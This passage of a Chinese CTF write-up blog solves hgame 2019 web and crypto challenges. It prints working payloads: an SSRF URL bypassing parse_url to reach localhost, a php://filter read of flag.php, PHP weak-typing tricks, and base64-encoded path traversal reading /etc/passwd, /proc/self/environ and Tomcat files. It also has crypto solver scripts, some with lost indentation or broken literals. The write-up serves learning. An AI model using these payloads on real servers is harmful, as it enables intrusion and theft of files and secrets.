class="keyword">if</span>(is_numeric($str5))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;step 6 fail&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($str5&lt;<span class="number">9999999999</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;step 7 fail&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">string</span>)$str5&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;step 8 fial&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (parse_url($url, PHP_URL_HOST) !== <span class="string">&quot;www.baidu.com&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;step 9 fail&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (parse_url($url,PHP_URL_SCHEME) !== <span class="string">&quot;http&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;step 10 fail&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch,CURLOPT_URL,$url);</span><br><span class="line">$output = curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line"><span class="keyword">if</span>($output === <span class="literal">FALSE</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;step 11 fail&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> $output;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>几个简单的php trick</p><ol><li>md5+ php弱类型</li><li>md5不处理数组</li><li>php在接受数据时会自动把’+‘和’.‘替换为’_’</li><li>php中数字总是比数组小</li></ol><p>之后发现像是一个SSRF, 结合访问<code>admin.php</code>得到的提示：<code>only localhost can see it</code>，而可以推测，这里是通过SSRF来读文件。</p><p>但是代码中有一小段对url做了过滤，需要绕过一下, 参考<a href="https://www.jianshu.com/p/b31b7b1ca3cb">https://www.jianshu.com/p/b31b7b1ca3cb</a></p><p>原理：主要利用<code>parse_url</code>将最后一个有效的<code>@host</code>作为host。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (parse_url($url, PHP_URL_HOST) !== <span class="string">&quot;www.baidu.com&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;step 9 fail&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (parse_url($url,PHP_URL_SCHEME) !== <span class="string">&quot;http&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;step 10 fail&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后的payload：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;118.24.3.214:3001&#x2F;?str1&#x3D;240610708&amp;str2&#x3D;QNKCDZO&amp;str3[]&#x3D;123&amp;str4[]&#x3D;456&amp;H+game[]&#x3D;&amp;url&#x3D;http:&#x2F;&#x2F;@127.0.0.1:80@www.baidu.com&#x2F;admin.php</span><br></pre></td></tr></table></figure><p>之后，得到<code>admin.php</code>的内容</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] != <span class="string">&#x27;127.0.0.1&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;only localhost can see it&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">$filename = $_GET[<span class="string">&#x27;filename&#x27;</span>]??<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (file_exists($filename)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;sorry,you can&#x27;t see it&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents($filename);</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>不允许文件名为存在的文件名，笔者采用php伪协议文件流绕过：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;flag.php</span><br></pre></td></tr></table></figure><p>也可以通过<code>xxxdir/../flag.php</code>方式绕过</p><p>最终payload</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;118.24.3.214:3001&#x2F;?str1&#x3D;240610708&amp;str2&#x3D;QNKCDZO&amp;str3[]&#x3D;123&amp;str4[]&#x3D;456&amp;H+game[]&#x3D;&amp;url&#x3D;http:&#x2F;&#x2F;@127.0.0.1:80@www.baidu.com&#x2F;admin.php?filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;flag.php</span><br></pre></td></tr></table></figure><p>flag</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PD9waHAgJGZsYWcgPSBoZ2FtZXtUaEVyNF9BcjRfczBtNF9QaHBfVHIxY2tzfSA&#x2F;Pgo&#x3D;</span><br><span class="line">&lt;?php $flag &#x3D; hgame&#123;ThEr4_Ar4_s0m4_Php_Tr1cks&#125; ?&gt; </span><br></pre></td></tr></table></figure><h2 id="PHP-Is-The-Best-Language"><a href="#PHP-Is-The-Best-Language" class="headerlink" title="PHP Is The Best Language"></a>PHP Is The Best Language</h2><blockquote><p>描述<br>var_dump了解一下<br>URL <a href="http://118.25.89.91:8888/flag.php">http://118.25.89.91:8888/flag.php</a></p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;secret.php&#x27;</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">#echo $flag; </span></span><br><span class="line"><span class="comment">#echo $secret; </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($_POST[<span class="string">&#x27;gate&#x27;</span>]) || <span class="keyword">empty</span>($_POST[<span class="string">&#x27;key&#x27;</span>])) &#123; </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">exit</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;door&#x27;</span>]))&#123; </span><br><span class="line">    $secret = hash_hmac(<span class="string">&#x27;sha256&#x27;</span>, $_POST[<span class="string">&#x27;door&#x27;</span>], $secret); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">$gate = hash_hmac(<span class="string">&#x27;sha256&#x27;</span>, $_POST[<span class="string">&#x27;key&#x27;</span>], $secret); </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($gate !== $_POST[<span class="string">&#x27;gate&#x27;</span>]) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Hacker GetOut!!&quot;</span>; </span><br><span class="line">    <span class="keyword">exit</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((md5($_POST[<span class="string">&#x27;key&#x27;</span>])+<span class="number">1</span>) == (md5(md5($_POST[<span class="string">&#x27;key&#x27;</span>])))+<span class="number">1</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Wow!!!&quot;</span>; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>; </span><br><span class="line">    <span class="keyword">echo</span> $flag; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Hacker GetOut!!&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>首先，<code>secret</code>用了一个<code>hash_mac</code>函数，这个函数有问题的，查手册，容易发现：</p><p><img src="https://i.loli.net/2019/02/20/5c6d5a12e2977.png"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hash_hmac( string $algo, string $data, string $key[, bool $raw_output &#x3D; FALSE] )</span><br></pre></td></tr></table></figure><p>函数处理的<code>$data</code>参数是数组的时候，会出错返回<code>NULL</code>,于是我们可以利用这一点使<code>secret</code>可控。php弱类型<code>null==0</code>。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(md5($_POST[&#39;key&#39;])+1) &#x3D;&#x3D; (md5(md5($_POST[&#39;key&#39;])))+1</span><br></pre></td></tr></table></figure><p>一种是通过<code>md5($_POST[&#39;key&#39;]) == (md5(md5($_POST[&#39;key&#39;])))</code></p><p>二种是因为<code>+1</code>的存在，找到两个值开头数字相同的就可以了。</p><p>我选择第一种，找到了这个<code> 7r4lGXCH2Ksu2JNT3BYM</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">7r4lGXCH2Ksu2JNT3BYM</span><br><span class="line">md5(7r4lGXCH2Ksu2JNT3BYM) &#x3D;&gt;</span><br><span class="line">0e269ab12da27d79a6626d91f34ae849</span><br><span class="line">md5(md5(7r4lGXCH2Ksu2JNT3BYM)) &#x3D;&gt;</span><br><span class="line">0e48d320b2a97ab295f5c4694759889f</span><br></pre></td></tr></table></figure><p>求gate：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php&gt; var_dump(hash_hmac(&#39;sha256&#39;,</span><br><span class="line">&#39;7r4lGXCH2Ksu2JNT3BYM&#39;, NULL))</span><br><span class="line">string(64)</span><br><span class="line">&quot;81f581b7553943f5041f054ca92e5e7e490e2c40296a93d94d214f1</span><br><span class="line">36aa84fe6&quot;</span><br></pre></td></tr></table></figure><p>最终<strong>payload</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gate&#x3D;81f581b7553943f5041f054ca92e5e7e490e2c40296a93d94d214f136aa84fe6&amp;key&#x3D;7r4lGXCH2Ksu2JNT3BYM&amp;door[]&#x3D;1</span><br></pre></td></tr></table></figure><p><strong>flag</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hgame&#123;Php_MayBe_Not_Safe&#125;</span><br></pre></td></tr></table></figure><h2 id="Baby-Spider"><a href="#Baby-Spider" class="headerlink" title="Baby_Spider"></a>Baby_Spider</h2><blockquote><p>描述<br>Come to death in the ocean of mathematics together with Li4n0!<br>Answer 30 questions correctly in a row during 40 seconds(The calculation result is subject to python3),then you can get the flag. Enjoy it~<br>hint1:The most basic operation of a spider is to disguise itself.<br>hint2:Always believe only what you see with your own eyes<br>URL <a href="http://111.231.140.29:10000/">http://111.231.140.29:10000</a></p></blockquote><p><strong>1-10 关</strong></p><p>正常的爬虫，但是注意加上UA头。</p><p><strong>11-20 关</strong></p><p>使用了一个很骚的反爬虫机制，更换了css中的字体。</p><p>使得浏览器显示的数字与content中的数字不同。</p><p>将字体下载下来，找到一一对应关系，写一个替换规则就好了。</p><p><strong>21-30关</strong></p><p>使用after伪元素做了替换，这里直接抓取一下css中真实的算式就可以了。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">header=&#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">token=&#123;</span><br><span class="line">    <span class="string">&#x27;token&#x27;</span>:<span class="string">&#x27;T0tI6mS6pFyAISBhgrM8BN1k0MOdNM88&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">list=<span class="string">&#x27;1026943587&#x27;</span></span><br><span class="line">url=<span class="string">&#x27;http://111.231.140.29:10000/&#x27;</span></span><br><span class="line">url1=<span class="string">&#x27;http://111.231.140.29:10000/question&#x27;</span></span><br><span class="line">url2=<span class="string">&#x27;http://111.231.140.29:10000/solution&#x27;</span></span><br><span class="line">url3=<span class="string">&#x27;http://111.231.140.29:10000/statics/style.css&#x27;</span></span><br><span class="line">res = <span class="string">&#x27;&lt;span&gt;(.*?)=&#x27;</span></span><br><span class="line">r=requests.post(url=url,data=token)</span><br><span class="line">session=r.cookies</span><br><span class="line">print(<span class="string">&quot;[*] &quot;</span>+<span class="string">&quot;-&quot;</span>*<span class="number">40</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">10</span>):</span><br><span class="line">    math = re.findall(res, r.content.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    math = str(math)[<span class="number">2</span>:len(math) - <span class="number">3</span>]</span><br><span class="line">    print(<span class="string">&#x27;[+] %d :&#x27;</span>%i + math)</span><br><span class="line">    math = eval(math)</span><br><span class="line">    result = &#123;</span><br><span class="line">        <span class="string">&#x27;answer&#x27;</span>: math</span><br><span class="line">    &#125;</span><br><span class="line">    r=requests.post(url=url2,data=result,cookies=session,headers=header)</span><br><span class="line">    session = r.cookies</span><br><span class="line">    print(<span class="string">&quot;[*] &quot;</span> + <span class="string">&quot;-&quot;</span> * <span class="number">40</span>)</span><br><span class="line"></span><br><span class="line">tmp=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>,<span class="number">20</span>):</span><br><span class="line">    math = re.findall(res, r.content.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    math = str(math)[<span class="number">2</span>:len(math) - <span class="number">3</span>]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> math:</span><br><span class="line">        <span class="keyword">if</span> ord(j) &gt; <span class="number">47</span>:</span><br><span class="line">            tmp += list[int(j)]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tmp += j</span><br><span class="line">    math = tmp</span><br><span class="line">    tmp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    print(<span class="string">&#x27;[+] %d :&#x27;</span> % i + math)</span><br><span class="line">    answer = (eval(math))</span><br><span class="line">    result = &#123;</span><br><span class="line">        <span class="string">&#x27;answer&#x27;</span>: answer</span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(url=url2, data=result, cookies=session, headers=header)</span><br><span class="line">    session = r.cookies</span><br><span class="line">    print(<span class="string">&quot;[*] &quot;</span> + <span class="string">&quot;-&quot;</span> * <span class="number">40</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">res = <span class="string">&#x27;content:&quot;(.*?)=&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>,<span class="number">30</span>):</span><br><span class="line">    css = requests.get(url=url3, cookies=session, headers=header)</span><br><span class="line">    math = re.findall(res, css.content.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    math = str(math)[<span class="number">2</span>:len(math) - <span class="number">3</span>]</span><br><span class="line">    print(<span class="string">&#x27;[+] %d :&#x27;</span> % i + math)</span><br><span class="line">    answer = (eval(math))</span><br><span class="line">    result = &#123;</span><br><span class="line">        <span class="string">&#x27;answer&#x27;</span>: answer</span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(url=url2, data=result, cookies=session, headers=header)</span><br><span class="line">    session=r.cookies</span><br><span class="line">    print(<span class="string">&quot;[*] &quot;</span> + <span class="string">&quot;-&quot;</span> * <span class="number">40</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;hgame&quot;</span> <span class="keyword">in</span> r.content.decode(<span class="string">&#x27;utf-8&#x27;</span>):</span><br><span class="line">        print(r.content.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[+] 28 :3898465&#x2F;(242636442&#x2F;774712632&#x2F;627122699&#x2F;(524541058))</span><br><span class="line">[*] ----------------------------------------</span><br><span class="line">[+] 29 :(699759722&#x2F;65326526+789619879*78001637+875760928)</span><br><span class="line">[*] ----------------------------------------</span><br><span class="line">hgame&#123;88c240c943d3f724a0bb59ebe37a5a49da22e40c0a8b2e0e659131165ea18825&#125;</span><br></pre></td></tr></table></figure><h2 id="Math有趣"><a href="#Math有趣" class="headerlink" title="Math有趣"></a>Math有趣</h2><blockquote><p>描述<br>Math is interesting, isn’t it?<br>update: 题中最后的^是乘方，不是xor<br>hint: 了解一下tomcat、spring mvc的目录结构和配置文件(自己搭一下就明白了<br>hint2: 图片目录不在web目录下<br>URL <a href="http://test.tan90.me:8080/index.php">http://test.tan90.me:8080/index.php</a></p></blockquote><p>回答完<code>1+1=2</code>后，正式进入题目，看到一个很复杂的数学问题，本想瞎子啊下来直接搜索看答案，但是发现下载下来文件叫<code>cXVlc3Rpb24ucG5n.php</code>。怎么这么奇怪，为什么还是php，这里会想到是有点像<code>url重写技术</code></p><p>但是明眼人一下就看出来，这只是一段简单的<code>base64</code>，这也就造成了任意文件读取：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cXVlc3Rpb24ucG5nquestion.png</span><br><span class="line">Li4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA&#x3D;&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/02/22/5c6f55f0f18cf.png"></p><p>但是不知道flag的路径，试着读了一下，无果。于是找服务文件的路径和配置文件的路径：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">..&#x2F;..&#x2F;..&#x2F;..&#x2F;proc&#x2F;self&#x2F;environLi4vLi4vLi4vLi4vcHJvYy9zZWxmL2Vudmlyb24&#x3D;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/02/22/5c6f5d632c82d.png"></p><p>之后呢，看看tomcat的配置<code> /usr/local/tomcat/conf/server.xml</code>发现出题人并没有修改默认的web路径，还是在<code>/usr/local/tomcat/webapps/ROOT</code></p><p><img src="https://i.loli.net/2019/02/22/5c6f5fe3a8db9.png"></p><p>接下来，看一下<code>ROOT/WEB-INF/web.xml</code></p><p><img src="https://i.loli.net/2019/02/22/5c6f6047b7575.png"></p><p>发现一个<code>mathyouqu的路由</code>：访问<code>mathyouqu-servlet.xml</code></p><p><img src="https://i.loli.net/2019/02/22/5c6f621dcded5.png"></p><p>但是只有包名<code>hgame.controller</code>没有具体的文件名。</p><p>回头试试看有没有报错之类的，因为其使用base64编解码，于是错误的BASE64可能会导致java类报错：</p><p><img src="https://i.loli.net/2019/02/22/5c6f63202f93d.png"></p><p>得到class文件</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">..&#x2F;..&#x2F;..&#x2F;..&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;ROOT&#x2F;WEB-INF&#x2F;classes&#x2F;hgame&#x2F;controller&#x2F;MathController.class</span><br><span class="line"></span><br><span class="line">Li4vLi4vLi4vLi4vdXNyL2xvY2FsL3RvbWNhdC93ZWJhcHBzL1JPT1QvV0VCLUlORi9jbGFzc2VzL2hnYW1lL2NvbnRyb2xsZXIvTWF0aENvbnRyb2xsZXIuY2xhc3M&#x3D;</span><br></pre></td></tr></table></figure><p>用Jad反编译成java文件（<a href="https://varaneckas.com/jad/">Jad下载链接</a>）：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\SecTools\Web渗透\JAD\jad158g.win</span><br><span class="line">λ jad -o -r -s java -d src math2.class</span><br><span class="line">Parsing math2.class... Generating src\hgame\controller\MathController.java</span><br></pre></td></tr></table></figure><p>直接看关键代码：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">Flag</span><span class="params">(ModelMap model)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;This is the last question.&quot;</span>);</span><br><span class="line">    System.out.println(<span class="string">&quot;123852^x % 612799081 = 6181254136845 % 612799081&quot;</span>);</span><br><span class="line">    System.out.println(<span class="string">&quot;The flag is hgame&#123;x&#125;.x is a decimal number.&quot;</span>);</span><br><span class="line">    model.addAttribute(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;Flag is not here.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;flag&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>真的是一个数学问题，一个方程</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">123852^x % 612799081 &#x3D; 6181254136845 % 612799081</span><br></pre></td></tr></table></figure><p>爆破得解（但是比较耗时）</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">res = pow(<span class="number">123852</span>,x,<span class="number">612799081</span>)</span><br><span class="line"><span class="keyword">if</span> res == <span class="number">6181254136845</span> % <span class="number">612799081</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;find: &quot;</span> + str(x)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> x</span><br><span class="line">x+=<span class="number">1</span></span><br><span class="line"><span class="comment"># find: 15387368</span></span><br></pre></td></tr></table></figure><hr><p>因为是第一次做有关Java的题目，也是第一次接触Java反编译，很感谢出题人，下面给出几篇<strong>参考链接</strong>：</p><ol><li><a href="https://blog.csdn.net/qq_19714505/article/details/80309968">java的class文件批量反编译成java</a></li><li><a href="https://blog.csdn.net/sinat_26935081/article/details/51283706">Spring MVC工程结构及配置整理</a></li><li><a href="https://www.cnblogs.com/liuhongfeng/p/4177835.html">Windows下如何配置tomcat环境变量</a></li></ol><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="浪漫的足球圣地"><a href="#浪漫的足球圣地" class="headerlink" title="浪漫的足球圣地"></a>浪漫的足球圣地</h2><blockquote><p>描述<br>无<br>URL <a href="http://plir4axuz.bkt.clouddn.com/hgame2019/orz/enc.txt">http://plir4axuz.bkt.clouddn.com/hgame2019/orz/enc.txt</a></p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">966A969596A9965996999565A5A59696A5A6A59A9699A599A596A595A599A569A5A99699A56996A596A696A996A6A5A696A9A595969AA5A69696A5A99696A595A59AA56A96A9A5A9969AA59A9559</span><br></pre></td></tr></table></figure><p>曼切斯特编码，改成二进制</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="linespan><br></pre></td></tr></table></figure><p>参考<a href="https://zh.wikipedia.org/wiki/%E6%9B%BC%E5%BD%BB%E6%96%AF%E7%89%B9%E7%BC%96%E7%A0%81">https://zh.wikipedia.org/wiki/%E6%9B%BC%E5%BD%BB%E6%96%AF%E7%89%B9%E7%BC%96%E7%A0%81</a></p><p>曼彻斯特编码有两种形式，可以都试一下，本题为<code>01-&gt;1,10-&gt;0</code>给出解密脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8 </span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;曼彻斯特解码\n&quot;</span> </span><br><span class="line"><span class="comment">#01对应1  10对应0 </span></span><br><span class="line">r=<span class="string">&#x27;&#x27;</span> </span><br><span class="line">s=<span class="string">&#xx27;</span> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(s)/<span class="number">2</span>): </span><br><span class="line">    c=s[i* <span class="number">2</span>:i*<span class="number">2</span>+<span class="number">2</span>] </span><br><span class="line">    <span class="keyword">if</span> c==<span class="string">&#x27;01&#x27;</span>:  </span><br><span class="line">        r+= <span class="string">&#x27;1&#x27;</span> </span><br><span class="line">    <span class="keyword">else</span>:  </span><br><span class="line">        r+= <span class="string">&#x27;0&#x27;</span> </span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;r--&gt;&#x27;</span> + r + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">print(hex(int(r, <span class="number">2</span>))[<span class="number">2</span>:<span class="number">-1</span>].decode(<span class="string">&quot;hex&quot;</span>))</span><br></pre></td></tr></table></figure><p>flag</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hgame&#123;3f24e567591e9cbab2a7d2f1f748a1d4&#125;</span><br></pre></td></tr></table></figure><h2 id="hill"><a href="#hill" class="headerlink" title="hill"></a>hill</h2><blockquote><p>Description<br>hill密码，秘钥是3x3矩阵，flag的密文是TCSHXZTCXAPBDKJVJDOHJEAE，flag中含有BABYSHILL，flag是有意义的英文，最终提交格式: hgame{有意义的英文} hint1: <a href="https://en.wikipedia.org/wiki/Hill_cipher">https://en.wikipedia.org/wiki/Hill_cipher</a> hint2: 模逆元</p></blockquote><p>hill密码，已知明文攻击。贴一下官方WP吧</p><p>相关链接: </p><ul><li><p><a href="https://en.wikipedia.org/wiki/Hill_cipher">https://en.wikipedia.org/wiki/Hill_cipher</a></p></li><li><p><a href="http://www.practicalcryptography.com/ciphers/hill-cipher/">http://www.practicalcryptography.com/ciphers/hill-cipher/</a> </p></li><li><p><a href="http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-hill-cipher/">http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-hill-cipher/</a></p></li></ul><p><img src="https://i.loli.net/2019/02/23/5c70c40a72033.png"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> Matrix</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> crypt</span><br><span class="line">alphabet = string.ascii_uppercase</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert2matrix</span>(<span class="params">m, dimension</span>):</span></span><br><span class="line"><span class="keyword">for</span> index, i <span class="keyword">in</span> enumerate(m):</span><br><span class="line">values = []</span><br><span class="line"><span class="keyword">if</span> index % dimension == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, dimension):</span><br><span class="line">values.append([alphabet.index(m[index + j])])</span><br><span class="line"><span class="keyword">if</span> index == <span class="number">0</span>:</span><br><span class="line">m_mat = np.matrix(values)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">m_mat = np.hstack((m_mat, values))</span><br><span class="line"><span class="keyword">return</span> m_mat</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">m = <span class="string">&#x27;BABYSHILL&#x27;</span></span><br><span class="line">c = <span class="string">&#x27;HXZTCXAPB&#x27;</span></span><br><span class="line">dimension = <span class="number">3</span></span><br><span class="line">unknown_c = <span class="string">&#x27;TCSHXZTCXAPBDKJVJDOHJEAE&#x27;</span></span><br><span class="line">c = convert2matrix(c, dimension)</span><br><span class="line">c = Matrix(c)</span><br><span class="line">c_inv = c.inv_mod(<span class="number">26</span>) <span class="comment"># 模逆矩阵，直接调库了，不调库自己实现或者通过numpy的逆矩阵稍加修改可以</span></span><br><span class="line">c_inv = c_inv.tolist()</span><br><span class="line"></span><br><span class="line">m = convert2matrix(m, dimension)</span><br><span class="line">m = np.matrix(m)</span><br><span class="line">dec_key = m*c_inv</span><br><span class="line">dec_key %= <span class="number">26</span></span><br><span class="line">print(dec_key)</span><br><span class="line">m1 = crypt.hill_crypt(unknown_c,dec_key,dimension) <span class="comment">#这是自己实现的简单的hill加密函数，也可用在线网站加密</span></span><br><span class="line">print(m1)</span><br></pre></td></tr></table></figure><h2 id="Vigener"><a href="#Vigener" class="headerlink" title="Vigener~"></a>Vigener~</h2><blockquote><p>Description<br>普通的Vigener<br>URL <a href="http://plir4axuz.bkt.clouddn.com/hgame2019/orz/ciphertext.txt">http://plir4axuz.bkt.clouddn.com/hgame2019/orz/ciphertext.txt</a></p></blockquote><p><a href="https://www.guballa.de/vigenere-solver">维吉尼亚密码解密神站</a></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Zbi Namyrwjk wmhzk cw s eknlgv uz ifuxstlata edhnufwlow xwpz vc mkohk s kklmwk uz mflklagnkh Gswyuv uavbijk, huwwv uh xzw ryxlwxm sx s qycogxx. Ml ay u jgjs ij hgrsedhnufwlow wmtynmlmzcsf. Lny gahnyv ak kuwq lu orvwxmxsfj urv asjpwekhx, tmz cx jwycwlwj upd szniehzm xg txyec az zsj lnliw ukhxmjoyw, ozowl wsxhiv az nlw vkmgjavnmgf ry gzalzvw atxiuzozjjshfi. Ests twgvfi zsby xjakx xg asjpwekhx wfilchloir kunyqwk zbel sxy ikkkhxasrfc Namyrwjk wmhzklw. Af kckzlkyr kadnc lzxyi, Xjoyhjaib Oskomoa ogm xzw lcvkl zi tmtrcwz s myrwjgf qwlnih gx jygahnyvafm Pmywtyvw 